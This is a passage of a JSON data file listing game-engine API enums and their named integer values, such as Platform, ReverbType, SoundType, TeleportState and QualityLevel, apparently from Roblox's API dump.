Value":0,"Enum":"MouseBehavior"},{"type":"EnumItem","Name":"LockCenter","tags":[],"Value":1,"Enum":"MouseBehavior"},{"type":"EnumItem","Name":"LockCurrentPosition","tags":[],"Value":2,"Enum":"MouseBehavior"},{"type":"Enum","Name":"MoveState","tags":[]},{"type":"EnumItem","Name":"Stopped","tags":[],"Value":0,"Enum":"MoveState"},{"type":"EnumItem","Name":"Coasting","tags":[],"Value":1,"Enum":"MoveState"},{"type":"EnumItem","Name":"Pushing","tags":[],"Value":2,"Enum":"MoveState"},{"type":"EnumItem","Name":"Stopping","tags":[],"Value":3,"Enum":"MoveState"},{"type":"EnumItem","Name":"AirFree","tags":[],"Value":4,"Enum":"MoveState"},{"type":"Enum","Name":"NameOcclusion","tags":[]},{"type":"EnumItem","Name":"OccludeAll","tags":[],"Value":2,"Enum":"NameOcclusion"},{"type":"EnumItem","Name":"EnemyOcclusion","tags":[],"Value":1,"Enum":"NameOcclusion"},{"type":"EnumItem","Name":"NoOcclusion","tags":[],"Value":0,"Enum":"NameOcclusion"},{"type":"Enum","Name":"NetworkOwnership","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"NetworkOwnership"},{"type":"EnumItem","Name":"Manual","tags":[],"Value":1,"Enum":"NetworkOwnership"},{"type":"Enum","Name":"NormalId","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":1,"Enum":"NormalId"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":4,"Enum":"NormalId"},{"type":"EnumItem","Name":"Back","tags":[],"Value":2,"Enum":"NormalId"},{"type":"EnumItem","Name":"Front","tags":[],"Value":5,"Enum":"NormalId"},{"type":"EnumItem","Name":"Right","tags":[],"Value":0,"Enum":"NormalId"},{"type":"EnumItem","Name":"Left","tags":[],"Value":3,"Enum":"NormalId"},{"type":"Enum","Name":"OverrideMouseIconBehavior","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"OverrideMouseIconBehavior"},{"type":"EnumItem","Name":"ForceShow","tags":[],"Value":1,"Enum":"OverrideMouseIconBehavior"},{"type":"EnumItem","Name":"ForceHide","tags":[],"Value":2,"Enum":"OverrideMouseIconBehavior"},{"type":"Enum","Name":"PacketPriority","tags":[]},{"type":"EnumItem","Name":"IMMEDIATE_PRIORITY","tags":[],"Value":0,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"HIGH_PRIORITY","tags":[],"Value":1,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"MEDIUM_PRIORITY","tags":[],"Value":2,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"LOW_PRIORITY","tags":[],"Value":3,"Enum":"PacketPriority"},{"type":"Enum","Name":"PacketReliability","tags":[]},{"type":"EnumItem","Name":"UNRELIABLE","tags":[],"Value":0,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"UNRELIABLE_SEQUENCED","tags":[],"Value":1,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE","tags":[],"Value":2,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE_ORDERED","tags":[],"Value":3,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE_SEQUENCED","tags":[],"Value":4,"Enum":"PacketReliability"},{"type":"Enum","Name":"PartType","tags":[]},{"type":"EnumItem","Name":"Ball","tags":[],"Value":0,"Enum":"PartType"},{"type":"EnumItem","Name":"Block","tags":[],"Value":1,"Enum":"PartType"},{"type":"EnumItem","Name":"Cylinder","tags":[],"Value":2,"Enum":"PartType"},{"type":"Enum","Name":"PathStatus","tags":[]},{"type":"EnumItem","Name":"Success","tags":[],"Value":0,"Enum":"PathStatus"},{"type":"EnumItem","Name":"ClosestNoPath","tags":[],"Value":1,"Enum":"PathStatus"},{"type":"EnumItem","Name":"ClosestOutOfRange","tags":[],"Value":2,"Enum":"PathStatus"},{"type":"EnumItem","Name":"FailStartNotEmpty","tags":[],"Value":3,"Enum":"PathStatus"},{"type":"EnumItem","Name":"FailFinishNotEmpty","tags":[],"Value":4,"Enum":"PathStatus"},{"type":"Enum","Name":"PhysicalPropertiesMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":1,"Enum":"PhysicalPropertiesMode"},{"type":"EnumItem","Name":"Legacy","tags":[],"Value":0,"Enum":"PhysicalPropertiesMode"},{"type":"EnumItem","Name":"New","tags":[],"Value":2,"Enum":"PhysicalPropertiesMode"},{"type":"Enum","Name":"PhysicsReceiveMethod","tags":[]},{"type":"EnumItem","Name":"Direct","tags":[],"Value":0,"Enum":"PhysicsReceiveMethod"},{"type":"EnumItem","Name":"Interpolation","tags":[],"Value":1,"Enum":"PhysicsReceiveMethod"},{"type":"Enum","Name":"PhysicsSendMethod","tags":[]},{"type":"EnumItem","Name":"ErrorComputation","tags":[],"Value":0,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"ErrorComputation2","tags":[],"Value":1,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"RoundRobin","tags":[],"Value":2,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"TopNErrors","tags":[],"Value":3,"Enum":"PhysicsSendMethod"},{"type":"Enum","Name":"Platform","tags":[]},{"type":"EnumItem","Name":"Windows","tags":[],"Value":0,"Enum":"Platform"},{"type":"EnumItem","Name":"OSX","tags":[],"Value":1,"Enum":"Platform"},{"type":"EnumItem","Name":"IOS","tags":[],"Value":2,"Enum":"Platform"},{"type":"EnumItem","Name":"Android","tags":[],"Value":3,"Enum":"Platform"},{"type":"EnumItem","Name":"XBoxOne","tags":[],"Value":4,"Enum":"Platform"},{"type":"EnumItem","Name":"PS4","tags":[],"Value":5,"Enum":"Platform"},{"type":"EnumItem","Name":"PS3","tags":[],"Value":6,"Enum":"Platform"},{"type":"EnumItem","Name":"XBox360","tags":[],"Value":7,"Enum":"Platform"},{"type":"EnumItem","Name":"WiiU","tags":[],"Value":8,"Enum":"Platform"},{"type":"EnumItem","Name":"NX","tags":[],"Value":9,"Enum":"Platform"},{"type":"EnumItem","Name":"Ouya","tags":[],"Value":10,"Enum":"Platform"},{"type":"EnumItem","Name":"AndroidTV","tags":[],"Value":11,"Enum":"Platform"},{"type":"EnumItem","Name":"Chromecast","tags":[],"Value":12,"Enum":"Platform"},{"type":"EnumItem","Name":"Linux","tags":[],"Value":13,"Enum":"Platform"},{"type":"EnumItem","Name":"SteamOS","tags":[],"Value":14,"Enum":"Platform"},{"type":"EnumItem","Name":"WebOS","tags":[],"Value":15,"Enum":"Platform"},{"type":"EnumItem","Name":"DOS","tags":[],"Value":16,"Enum":"Platform"},{"type":"EnumItem","Name":"BeOS","tags":[],"Value":17,"Enum":"Platform"},{"type":"EnumItem","Name":"UWP","tags":[],"Value":18,"Enum":"Platform"},{"type":"EnumItem","Name":"None","tags":[],"Value":19,"Enum":"Platform"},{"type":"Enum","Name":"PlayerActions","tags":[]},{"type":"EnumItem","Name":"CharacterForward","tags":[],"Value":0,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterBackward","tags":[],"Value":1,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterLeft","tags":[],"Value":2,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterRight","tags":[],"Value":3,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterJump","tags":[],"Value":4,"Enum":"PlayerActions"},{"type":"Enum","Name":"PlayerChatType","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"PlayerChatType"},{"type":"EnumItem","Name":"Team","tags":[],"Value":1,"Enum":"PlayerChatType"},{"type":"EnumItem","Name":"Whisper","tags":[],"Value":2,"Enum":"PlayerChatType"},{"type":"Enum","Name":"PoseEasingDirection","tags":[]},{"type":"EnumItem","Name":"Out","tags":[],"Value":1,"Enum":"PoseEasingDirection"},{"type":"EnumItem","Name":"InOut","tags":[],"Value":2,"Enum":"PoseEasingDirection"},{"type":"EnumItem","Name":"In","tags":[],"Value":0,"Enum":"PoseEasingDirection"},{"type":"Enum","Name":"PoseEasingStyle","tags":[]},{"type":"EnumItem","Name":"Linear","tags":[],"Value":0,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Constant","tags":[],"Value":1,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Elastic","tags":[],"Value":2,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Cubic","tags":[],"Value":3,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Bounce","tags":[],"Value":4,"Enum":"PoseEasingStyle"},{"type":"Enum","Name":"PriorityMethod","tags":[]},{"type":"EnumItem","Name":"LastError","tags":[],"Value":0,"Enum":"PriorityMethod"},{"type":"EnumItem","Name":"AccumulatedError","tags":[],"Value":1,"Enum":"PriorityMethod"},{"type":"EnumItem","Name":"FIFO","tags":[],"Value":2,"Enum":"PriorityMethod"},{"type":"Enum","Name":"PrismSides","tags":[]},{"type":"EnumItem","Name":"3","tags":[],"Value":3,"Enum":"PrismSides"},{"type":"EnumItem","Name":"5","tags":[],"Value":5,"Enum":"PrismSides"},{"type":"EnumItem","Name":"6","tags":[],"Value":6,"Enum":"PrismSides"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"PrismSides"},{"type":"EnumItem","Name":"10","tags":[],"Value":10,"Enum":"PrismSides"},{"type":"EnumItem","Name":"20","tags":[],"Value":20,"Enum":"PrismSides"},{"type":"Enum","Name":"PrivilegeType","tags":[]},{"type":"EnumItem","Name":"Owner","tags":[],"Value":255,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Admin","tags":[],"Value":240,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Member","tags":[],"Value":128,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Visitor","tags":[],"Value":10,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Banned","tags":[],"Value":0,"Enum":"PrivilegeType"},{"type":"Enum","Name":"ProductPurchaseDecision","tags":[]},{"type":"EnumItem","Name":"NotProcessedYet","tags":[],"Value":0,"Enum":"ProductPurchaseDecision"},{"type":"EnumItem","Name":"PurchaseGranted","tags":[],"Value":1,"Enum":"ProductPurchaseDecision"},{"type":"Enum","Name":"PyramidSides","tags":[]},{"type":"EnumItem","Name":"3","tags":[],"Value":3,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"4","tags":[],"Value":4,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"5","tags":[],"Value":5,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"6","tags":[],"Value":6,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"10","tags":[],"Value":10,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"20","tags":[],"Value":20,"Enum":"PyramidSides"},{"type":"Enum","Name":"QualityLevel","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level01","tags":[],"Value":1,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level02","tags":[],"Value":2,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level03","tags":[],"Value":3,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level04","tags":[],"Value":4,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level05","tags":[],"Value":5,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level06","tags":[],"Value":6,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level07","tags":[],"Value":7,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level08","tags":[],"Value":8,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level09","tags":[],"Value":9,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level10","tags":[],"Value":10,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level11","tags":[],"Value":11,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level12","tags":[],"Value":12,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level13","tags":[],"Value":13,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level14","tags":[],"Value":14,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level15","tags":[],"Value":15,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level16","tags":[],"Value":16,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level17","tags":[],"Value":17,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level18","tags":[],"Value":18,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level19","tags":[],"Value":19,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level20","tags":[],"Value":20,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level21","tags":[],"Value":21,"Enum":"QualityLevel"},{"type":"Enum","Name":"RenderPriority","tags":[]},{"type":"EnumItem","Name":"First","tags":[],"Value":0,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Input","tags":[],"Value":100,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Camera","tags":[],"Value":200,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Character","tags":[],"Value":300,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Last","tags":[],"Value":2000,"Enum":"RenderPriority"},{"type":"Enum","Name":"Resolution","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"Resolution"},{"type":"EnumItem","Name":"720x526","tags":[],"Value":1,"Enum":"Resolution"},{"type":"EnumItem","Name":"800x600","tags":[],"Value":2,"Enum":"Resolution"},{"type":"EnumItem","Name":"1024x600","tags":[],"Value":3,"Enum":"Resolution"},{"type":"EnumItem","Name":"1024x768","tags":[],"Value":4,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x720","tags":[],"Value":5,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x768","tags":[],"Value":6,"Enum":"Resolution"},{"type":"EnumItem","Name":"1152x864","tags":[],"Value":7,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x800","tags":[],"Value":8,"Enum":"Resolution"},{"type":"EnumItem","Name":"1360x768","tags":[],"Value":9,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x960","tags":[],"Value":10,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x1024","tags":[],"Value":11,"Enum":"Resolution"},{"type":"EnumItem","Name":"1440x900","tags":[],"Value":12,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x900","tags":[],"Value":13,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x1024","tags":[],"Value":14,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x1200","tags":[],"Value":15,"Enum":"Resolution"},{"type":"EnumItem","Name":"1680x1050","tags":[],"Value":16,"Enum":"Resolution"},{"type":"EnumItem","Name":"1920x1080","tags":[],"Value":17,"Enum":"Resolution"},{"type":"EnumItem","Name":"1920x1200","tags":[],"Value":18,"Enum":"Resolution"},{"type":"Enum","Name":"ReverbType","tags":[]},{"type":"EnumItem","Name":"NoReverb","tags":[],"Value":0,"Enum":"ReverbType"},{"type":"EnumItem","Name":"GenericReverb","tags":[],"Value":1,"Enum":"ReverbType"},{"type":"EnumItem","Name":"PaddedCell","tags":[],"Value":2,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Room","tags":[],"Value":3,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Bathroom","tags":[],"Value":4,"Enum":"ReverbType"},{"type":"EnumItem","Name":"LivingRoom","tags":[],"Value":5,"Enum":"ReverbType"},{"type":"EnumItem","Name":"StoneRoom","tags":[],"Value":6,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Auditorium","tags":[],"Value":7,"Enum":"ReverbType"},{"type":"EnumItem","Name":"ConcertHall","tags":[],"Value":8,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Cave","tags":[],"Value":9,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Arena","tags":[],"Value":10,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Hangar","tags":[],"Value":11,"Enum":"ReverbType"},{"type":"EnumItem","Name":"CarpettedHallway","tags":[],"Value":12,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Hallway","tags":[],"Value":13,"Enum":"ReverbType"},{"type":"EnumItem","Name":"StoneCorridor","tags":[],"Value":14,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Alley","tags":[],"Value":15,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Forest","tags":[],"Value":16,"Enum":"ReverbType"},{"type":"EnumItem","Name":"City","tags":[],"Value":17,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Mountains","tags":[],"Value":18,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Quarry","tags":[],"Value":19,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Plain","tags":[],"Value":20,"Enum":"ReverbType"},{"type":"EnumItem","Name":"ParkingLot","tags":[],"Value":21,"Enum":"ReverbType"},{"type":"EnumItem","Name":"SewerPipe","tags":[],"Value":22,"Enum":"ReverbType"},{"type":"EnumItem","Name":"UnderWater","tags":[],"Value":23,"Enum":"ReverbType"},{"type":"Enum","Name":"RollOffMode","tags":[]},{"type":"EnumItem","Name":"Inverse","tags":[],"Value":0,"Enum":"RollOffMode"},{"type":"EnumItem","Name":"Linear","tags":[],"Value":1,"Enum":"RollOffMode"},{"type":"Enum","Name":"RotationType","tags":[]},{"type":"EnumItem","Name":"MovementRelative","tags":[],"Value":0,"Enum":"RotationType"},{"type":"EnumItem","Name":"CameraRelative","tags":[],"Value":1,"Enum":"RotationType"},{"type":"Enum","Name":"RuntimeUndoBehavior","tags":[]},{"type":"EnumItem","Name":"Aggregate","tags":[],"Value":0,"Enum":"RuntimeUndoBehavior"},{"type":"EnumItem","Name":"Snapshot","tags":[],"Value":1,"Enum":"RuntimeUndoBehavior"},{"type":"EnumItem","Name":"Hybrid","tags":[],"Value":2,"Enum":"RuntimeUndoBehavior"},{"type":"Enum","Name":"SaveFilter","tags":[]},{"type":"EnumItem","Name":"SaveAll","tags":[],"Value":2,"Enum":"SaveFilter"},{"type":"EnumItem","Name":"SaveWorld","tags":[],"Value":0,"Enum":"SaveFilter"},{"type":"EnumItem","Name":"SaveGame","tags":[],"Value":1,"Enum":"SaveFilter"},{"type":"Enum","Name":"SavedQualitySetting","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel1","tags":[],"Value":1,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel2","tags":[],"Value":2,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel3","tags":[],"Value":3,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel4","tags":[],"Value":4,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel5","tags":[],"Value":5,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel6","tags":[],"Value":6,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel7","tags":[],"Value":7,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel8","tags":[],"Value":8,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel9","tags":[],"Value":9,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel10","tags":[],"Value":10,"Enum":"SavedQualitySetting"},{"type":"Enum","Name":"ScaleType","tags":[]},{"type":"EnumItem","Name":"Stretch","tags":[],"Value":0,"Enum":"ScaleType"},{"type":"EnumItem","Name":"Slice","tags":[],"Value":1,"Enum":"ScaleType"},{"type":"Enum","Name":"SizeConstraint","tags":[]},{"type":"EnumItem","Name":"RelativeXY","tags":[],"Value":0,"Enum":"SizeConstraint"},{"type":"EnumItem","Name":"RelativeXX","tags":[],"Value":1,"Enum":"SizeConstraint"},{"type":"EnumItem","Name":"RelativeYY","tags":[],"Value":2,"Enum":"SizeConstraint"},{"type":"Enum","Name":"SleepAdjustMethod","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"SleepAdjustMethod"},{"type":"EnumItem","Name":"LastSample","tags":[],"Value":1,"Enum":"SleepAdjustMethod"},{"type":"EnumItem","Name":"AverageInterval","tags":[],"Value":2,"Enum":"SleepAdjustMethod"},{"type":"Enum","Name":"SoundType","tags":[]},{"type":"EnumItem","Name":"NoSound","tags":[],"Value":0,"Enum":"SoundType"},{"type":"EnumItem","Name":"Boing","tags":[],"Value":1,"Enum":"SoundType"},{"type":"EnumItem","Name":"Bomb","tags":[],"Value":2,"Enum":"SoundType"},{"type":"EnumItem","Name":"Break","tags":[],"Value":3,"Enum":"SoundType"},{"type":"EnumItem","Name":"Click","tags":[],"Value":4,"Enum":"SoundType"},{"type":"EnumItem","Name":"Clock","tags":[],"Value":5,"Enum":"SoundType"},{"type":"EnumItem","Name":"Slingshot","tags":[],"Value":6,"Enum":"SoundType"},{"type":"EnumItem","Name":"Page","tags":[],"Value":7,"Enum":"SoundType"},{"type":"EnumItem","Name":"Ping","tags":[],"Value":8,"Enum":"SoundType"},{"type":"EnumItem","Name":"Snap","tags":[],"Value":9,"Enum":"SoundType"},{"type":"EnumItem","Name":"Splat","tags":[],"Value":10,"Enum":"SoundType"},{"type":"EnumItem","Name":"Step","tags":[],"Value":11,"Enum":"SoundType"},{"type":"EnumItem","Name":"StepOn","tags":[],"Value":12,"Enum":"SoundType"},{"type":"EnumItem","Name":"Swoosh","tags":[],"Value":13,"Enum":"SoundType"},{"type":"EnumItem","Name":"Victory","tags":[],"Value":14,"Enum":"SoundType"},{"type":"Enum","Name":"SpecialKey","tags":[]},{"type":"EnumItem","Name":"Insert","tags":[],"Value":0,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"Home","tags":[],"Value":1,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"End","tags":[],"Value":2,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"PageUp","tags":[],"Value":3,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"PageDown","tags":[],"Value":4,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"ChatHotkey","tags":[],"Value":5,"Enum":"SpecialKey"},{"type":"Enum","Name":"Status","tags":[]},{"type":"EnumItem","Name":"Poison","tags":["deprecated"],"Value":0,"Enum":"Status"},{"type":"EnumItem","Name":"Confusion","tags":["deprecated"],"Value":1,"Enum":"Status"},{"type":"Enum","Name":"Stuff","tags":[]},{"type":"EnumItem","Name":"Heads","tags":[],"Value":0,"Enum":"Stuff"},{"type":"EnumItem","Name":"Faces","tags":[],"Value":1,"Enum":"Stuff"},{"type":"EnumItem","Name":"Hats","tags":[],"Value":2,"Enum":"Stuff"},{"type":"EnumItem","Name":"TShirts","tags":[],"Value":3,"Enum":"Stuff"},{"type":"EnumItem","Name":"Shirts","tags":[],"Value":4,"Enum":"Stuff"},{"type":"EnumItem","Name":"Pants","tags":[],"Value":5,"Enum":"Stuff"},{"type":"EnumItem","Name":"Gears","tags":[],"Value":6,"Enum":"Stuff"},{"type":"EnumItem","Name":"Torsos","tags":[],"Value":7,"Enum":"Stuff"},{"type":"EnumItem","Name":"LeftArms","tags":[],"Value":8,"Enum":"Stuff"},{"type":"EnumItem","Name":"RightArms","tags":[],"Value":9,"Enum":"Stuff"},{"type":"EnumItem","Name":"LeftLegs","tags":[],"Value":10,"Enum":"Stuff"},{"type":"EnumItem","Name":"RightLegs","tags":[],"Value":11,"Enum":"Stuff"},{"type":"EnumItem","Name":"Bodies","tags":[],"Value":12,"Enum":"Stuff"},{"type":"EnumItem","Name":"Costumes","tags":[],"Value":13,"Enum":"Stuff"},{"type":"Enum","Name":"Style","tags":[]},{"type":"EnumItem","Name":"AlternatingSupports","tags":[],"Value":0,"Enum":"Style"},{"type":"EnumItem","Name":"BridgeStyleSupports","tags":[],"Value":1,"Enum":"Style"},{"type":"EnumItem","Name":"NoSupports","tags":[],"Value":2,"Enum":"Style"},{"type":"Enum","Name":"SurfaceConstraint","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"Hinge","tags":[],"Value":1,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"SteppingMotor","tags":[],"Value":2,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":3,"Enum":"SurfaceConstraint"},{"type":"Enum","Name":"SurfaceType","tags":[]},{"type":"EnumItem","Name":"Smooth","tags":[],"Value":0,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Glue","tags":[],"Value":1,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Weld","tags":[],"Value":2,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Studs","tags":[],"Value":3,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Inlet","tags":[],"Value":4,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Universal","tags":[],"Value":5,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Hinge","tags":[],"Value":6,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":7,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"SteppingMotor","tags":[],"Value":8,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Unjoinable","tags":[],"Value":9,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"SmoothNoOutlines","tags":[],"Value":10,"Enum":"SurfaceType"},{"type":"Enum","Name":"SwipeDirection","tags":[]},{"type":"EnumItem","Name":"Right","tags":[],"Value":0,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Left","tags":[],"Value":1,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Up","tags":[],"Value":2,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Down","tags":[],"Value":3,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"None","tags":[],"Value":4,"Enum":"SwipeDirection"},{"type":"Enum","Name":"TeleportState","tags":[]},{"type":"EnumItem","Name":"RequestedFromServer","tags":[],"Value":0,"Enum":"TeleportState"},{"type":"EnumItem","Name":"Started","tags":[],"Value":1,"Enum":"TeleportState"},{"type":"EnumItem","Name":"WaitingForServer","tags":[],"Value":2,"Enum":"TeleportState"},{"type":"EnumItem","Name":"Failed","tags":[],"Value":3,"Enum":"TeleportState"},{"type":"EnumItem","Name":"InProgress","tags":[],"Value":4,"Enum":"TeleportState"},{"type":"Enum","Name":"TeleportType","tags":[]},{"type":"EnumItem","Name":"ToPlace","tags":[],"Value":0,"Enum":"TeleportType"},{"type":"EnumItem","Name":"ToInstance","tags":[],"Value":1,"Enum":"TeleportType"},{"type":"EnumItem","Name":"ToReservedServer","tags":[],"Value":2,"Enum":"TeleportType"},{"type":"Enum","Name":"TextXAlignment","tags":[]},{"type":"EnumItem","Name":"Left","tags":[],"Value":0,"Enum":"TextXAlignment"},{"type":"EnumItem","Name":"Center","tags":[],"Value":2,"Enum":"TextXAlignment"},{"type":"EnumItem","Name":"Right","tags":[],"Value":1,"Enum":"TextXAlignment"},{"type":"Enum","Name":"TextYAlignment","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":0,"Enum":"TextYAlignment"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"TextYAlignment"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":2,"Enum":"TextYAlignment"},{"type":"Enum","Name":"ThreadPoolConfig","tags":[]},{"type":"EnumItem","Name":"Auto","tags":[],"Value":0,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore1","tags":[],"Value":101,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore2","tags":[],"Value":102,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore3","tags":[],"Value":103,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore4","tags":[],"Value":104,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads1","tags":[],"Value":1,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads2","tags":[],"Value":2,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads3","tags":[],"Value":3,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads4","tags":[],"Value":4,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads8","tags":[],"Value":8,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads16","tags":[],"Value":16,"Enum":"ThreadPoolConfig"},{"type":"Enum","Name":"ThrottlingPriority","tags":[]},{"type":"EnumItem","Name":"Extreme","tags":[],"Value":2,"Enum":"ThrottlingPriority"},{"type":"EnumItem","Name":"ElevatedOnServer","tags":[],"Value":1,"Enum":"ThrottlingPriority"},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ThrottlingPriority"},{"type":"Enum","Name":"TickCountSampleMethod","tags":[]},{"type":"EnumItem","Name":"Fast","tags":[],"Value":0,"Enum":"TickCountSampleMethod"},{"type":"EnumItem","Name":"Benchmark","tags":[],"Value":1,"Enum":"TickCountSampleMethod"},{"type":"EnumItem","Name":"Precise","tags":[],"Value":2,"Enum":"TickCountSampleMethod"},{"type":"Enum","Name":"TopBottom","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":0,"Enum":"TopBottom"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"TopBottom"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":2,"Enum":"TopBottom"},{"type":"Enum","Name":"TouchCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"TouchCameraMovementMode"},{"type":"En